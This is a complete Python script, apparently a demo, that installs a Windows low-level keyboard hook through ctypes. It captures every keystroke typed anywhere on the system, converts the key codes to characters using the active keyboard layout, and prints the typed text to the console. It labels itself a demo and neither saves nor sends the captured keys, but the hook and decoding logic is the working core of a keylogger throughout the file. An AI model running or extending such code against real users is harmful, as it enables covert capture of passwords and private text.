from ctypes import *
from ctypes.wintypes import *
from ctypes import cast, POINTER
from datetime import datetime

# global variable for storing the hook
hook_id = None
captured_events = []

# global modifier states
shift_pressed = False
ctrl_pressed = False
alt_pressed = False

# declaring WinAPI structures and functions
user32 = WinDLL('user32')
kernel32 = WinDLL('kernel32')

# constants
WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
WM_KEYUP = 0x0101

key_map = {
        # numbers
        0x30: '0', 0x31: '1', 0x32: '2', 0x33: '3', 0x34: '4',
        0x35: '5', 0x36: '6', 0x37: '7', 0x38: '8', 0x39: '9',

        # Буквы (уже обрабатываются отдельно 0x41-0x5A)

        # char+Shift (for US)
        0xBA: ';',  # ;:
        0xBB: '=',  # =+
        0xBC: ',',  # ,<
        0xBD: '-',  # -_
        0xBE: '.',  # .>
        0xBF: '/',  # /?
        0xC0: '`',  # `~
        0xDB: '[',  # [{
        0xDC: '\\',  # \|
        0xDD: ']',  # ]}
        0xDE: "'",  # '"

        # NumPad
        0x60: '0', 0x61: '1', 0x62: '2', 0x63: '3', 0x64: '4',
        0x65: '5', 0x66: '6', 0x67: '7', 0x68: '8', 0x69: '9',
        0x6A: '*', 0x6B: '+', 0x6D: '-', 0x6E: '.', 0x6F: '/',

        # Фfunctional keys
        0x70: 'F1', 0x71: 'F2', 0x72: 'F3', 0x73: 'F4',
        0x74: 'F5', 0x75: 'F6', 0x76: 'F7', 0x77: 'F8',
        0x78: 'F9', 0x79: 'F10', 0x7A: 'F11', 0x7B: 'F12',

        # special keys (already in VK-code)
        0x08: 'Backspace', 0x09: 'Tab', 0x0D: 'Enter',
        0x10: 'Shift', 0x11: 'Ctrl', 0x12: 'Alt',
        0x14: 'CapsLock', 0x1B: 'Esc', 0x20: 'Space',
        0x21: 'PageUp', 0x22: 'PageDown', 0x23: 'End',
        0x24: 'Home', 0x25: 'Left', 0x26: 'Up',
        0x27: 'Right', 0x28: 'Down', 0x2D: 'Insert',
        0x2E: 'Delete', 0x2C: 'PrintScreen', 0x91: 'ScrollLock',
        0x13: 'Pause', 0x90: 'NumLock',

        0xA0: 'Shift', 0xA1: 'Shift',  # left/right Shift
        0xA2: 'Ctrl', 0xA3: 'Ctrl',  # left/right Ctrl
        0xA4: 'Alt', 0xA5: 'Alt',  # left/right Alt
        0x5B: 'Win', 0x5C: 'Win',

        0xE2: '<', 
    }


LRESULT = c_long
ULONG_PTR = c_ulong

HOOKPROC = CFUNCTYPE(LRESULT, c_int, WPARAM, LPARAM)

# definition of structures
class KBDLLHOOKSTRUCT(Structure):
    _fields_ = [
        ("vkCode", DWORD),
        ("scanCode", DWORD),
        ("flags", DWORD),
        ("time", DWORD),
        ("dwExtraInfo", ULONG_PTR)
    ]

class RawKeyEvent:
    def __init__(self, vk_code, scan_code, flags, time, event_type):
        self.vk_code = vk_code    # virtual code
        self.scan_code = scan_code
        self.flags = flags        # status flags
        self.time = time          # timestamp
        self.event_type = event_type  # WM_KEYDOWN/WM_KEYU

# function prototypes
user32.SetWindowsHookExA.argtypes = [c_int, HOOKPROC, c_void_p, DWORD]
user32.SetWindowsHookExA.restype = HHOOK

user32.CallNextHookEx.argtypes = [c_void_p, c_int, WPARAM, LPARAM]
user32.CallNextHookEx.restype = LRESULT

user32.UnhookWindowsHookEx.argtypes = [HHOOK]
user32.UnhookWindowsHookEx.restype = BOOL

@HOOKPROC
def hook_callback(nCode, wParam, lParam):
    global shift_pressed, ctrl_pressed, alt_pressed

    if nCode >= 0:
        kbd_struct = cast(lParam, POINTER(KBDLLHOOKSTRUCT)).contents

        # updating modifiers
        if kbd_struct.vkCode in [0x10, 0xA0, 0xA1]:
            shift_pressed = (wParam == WM_KEYDOWN)
        elif kbd_struct.vkCode in [0x11, 0xA2, 0xA3]:
            ctrl_pressed = (wParam == WM_KEYDOWN)
        elif kbd_struct.vkCode in [0x12, 0xA4, 0xA5]:
            alt_pressed = (wParam == WM_KEYDOWN)

        # skipping release events
        if (kbd_struct.flags & 0x80) or (wParam == WM_KEYUP):
            return user32.CallNextHookEx(None, nCode, wParam, lParam)

        caps_state = is_caps_lock()
        char = vk_code_to_char(kbd_struct.vkCode, shift_pressed, caps_state)

        # create event for every key
        event = RawKeyEvent(
            vk_code=kbd_struct.vkCode,
            scan_code=kbd_struct.scanCode,
            flags=kbd_struct.flags,
            time=kbd_struct.time,
            event_type=wParam
        )
        event.character = char
        captured_events.append(event)

        # print all simbils in terminal (not service key)
        if char and len(char) == 1 and char.isprintable():
            print(char, end='', flush=True)
        elif char in ['Enter', 'Tab', 'Space']:
            # special print for Enter, Tab, Space
            if char == 'Enter':
                print('\n', end='', flush=True)
            elif char == 'Tab':
                print('\t', end='', flush=True)
            elif char == 'Space':
                print(' ', end='', flush=True)
        
        # calculate statistics
        if len(captured_events) >= 256:
            print(f"\n[DEMO] Captured {len(captured_events)} keystrokes (not saved)")
            captured_events.clear()

    return user32.CallNextHookEx(None, nCode, wParam, lParam)

def is_caps_lock():
    return user32.GetKeyState(0x14) & 0x0001 != 0

def vk_code_to_char(vk_code, shift_pressed=False, caps_lock=False):

    # getting actual layout
    foreground_window = user32.GetForegroundWindow()
    thread_id = user32.GetWindowThreadProcessId(foreground_window, 0)
    layout = user32.GetKeyboardLayout(thread_id)

    # keyboard state
    keyboard_state = (c_byte * 256)()

    # set status Shift и CapsLock
    if shift_pressed:
        keyboard_state[0x10] = 0x80  # Shift pressed
    if caps_lock:
        keyboard_state[0x14] = 0x01  # CapsLock on

    # getting scan-code
    scan_code = user32.MapVirtualKeyExW(vk_code, 0, layout)

    buf = create_unicode_buffer(5)
    result = user32.ToUnicodeEx(vk_code, scan_code, keyboard_state, buf, 5, 0, layout)

    if result > 0:
        char = buf.value.replace('\x00', '')
        return char if char else key_map.get(vk_code, "")
    else:
        return key_map.get(vk_code, "")

hook_id = user32.SetWindowsHookExA(WH_KEYBOARD_LL, hook_callback, None, 0)
if not hook_id:
    print("Error: failed to install hook!")
    exit(1)

try:
    msg = MSG()
    # Usr PeekMessage instead GetMessage for unblockable reading
    while True:
        if user32.PeekMessageW(byref(msg), None, 0, 0, 0x0001) != 0:
            if user32.GetMessageW(byref(msg), None, 0, 0) != 0:
                user32.TranslateMessage(byref(msg))
                user32.DispatchMessageW(byref(msg))
        else:
            # Check Ctrl+C evry 100ms
            kernel32.Sleep(100)
except KeyboardInterrupt:
    print("\nWork is done...")
finally:
    if hook_id:
        user32.UnhookWindowsHookEx(hook_id)
